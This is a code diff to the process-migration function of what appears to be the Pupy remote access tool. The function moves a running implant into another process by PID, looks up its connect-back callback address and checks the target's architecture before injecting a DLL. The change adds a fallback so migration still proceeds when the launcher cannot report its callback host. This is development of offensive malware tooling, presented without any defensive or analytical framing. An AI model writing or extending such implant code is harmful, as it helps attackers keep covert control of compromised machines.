@@ -15,9 +15,15 @@ def migrate(module, pid, keep=False, timeout=30):
     dllbuf=b""
     isProcess64bits=False
     module.success("looking for configured connect back address ...")
-    res=module.client.conn.modules['pupy'].get_connect_back_host()
-    host, port=res.rsplit(':',1)
-    module.success("address configured is %s:%s ..."%(host,port))
+    try:
+        res=module.client.conn.modules['pupy'].get_connect_back_host()
+        host, port=res.rsplit(':',1)
+        module.success("address configured is %s:%s ..."%(host,port))
+    except:
+        if not keep:
+            module.error("launcher doesn't support connect back host information, disable keep")
+            keep = True
+
     module.success("looking for process %s architecture ..."%pid)
     arch = None
     if module.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
@@ -69,4 +75,3 @@ def migrate(module, pid, keep=False, timeout=30):
             module.error("migration timed out !")
             break
         time.sleep(0.5)
-
